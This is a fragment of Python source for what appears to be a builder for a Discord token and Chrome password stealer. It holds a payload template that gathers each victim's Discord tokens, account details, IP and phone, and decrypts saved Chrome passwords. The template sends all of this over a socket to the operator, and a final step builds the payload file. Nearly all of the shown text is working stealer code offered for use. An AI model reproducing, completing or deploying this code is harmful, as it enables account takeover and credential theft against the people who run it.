        data.append(f"Token: {token} | Username: {username} | Email: {email} | IP: {ip} | Phone: {phone if phone != '<:invalide:858700726905733120>' else False} | Nitro: {nitro == '<:valide:858700826499219466>'}")
        Grab.send("token", data)

    def chrome_passwords_grab(): 
        passwords = ChromePasswords()
        passwords.chromedb()
        passwords = passwords.passwordList
        Grab.send("passwords", [passwords, Grab.get_ip()[0]])
    

    def send(mode:str, data:dict):
        socket.send(dumps({mode:data}).encode(encoding))



# EXECUTE

if __name__ == '__main__':
    victim = Client(socket)

    Grab.chrome_passwords_grab()

    for token in Discord.get_tokens():
        Grab.discord_token_grab(token)
    
    socket.close()
'''


try:
    build()
except Exception as e:
    input(Col.red + "Error! [{}]".format(e)+Col.white)
    exit()

input(Col.red + "Done!" + Col.white)
